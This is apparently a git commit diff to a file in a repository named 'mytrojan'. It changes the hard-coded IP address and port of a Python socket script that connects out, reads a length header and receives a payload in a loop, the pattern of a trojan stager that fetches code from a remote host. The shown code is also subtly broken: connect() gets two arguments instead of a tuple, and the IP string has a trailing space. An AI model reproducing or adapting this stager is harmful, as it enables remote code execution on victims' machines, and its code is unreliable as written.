9b160ed3be0ba82f520d984b5af466b7a1bd2e27
Mzgin L Ghazi <158284454+mzgindosky96@users.noreply.github.com>
2025-05-01 22:16:11 +0300

    Update listenerios.py

--- mytrojan/listenerios.py
+++ mytrojan/listenerios.py
@@ -1,6 +1,6 @@
 import socket,struct
 s = socket.socket(2,1)
-s.connect('192.168.86.40',1234)
+s.connect('192.168.119.128 ',5574)
 l = struct.unpack('>I', s.recv(4))[0]
 d = s.recv(4096)
 while len(d) != l:
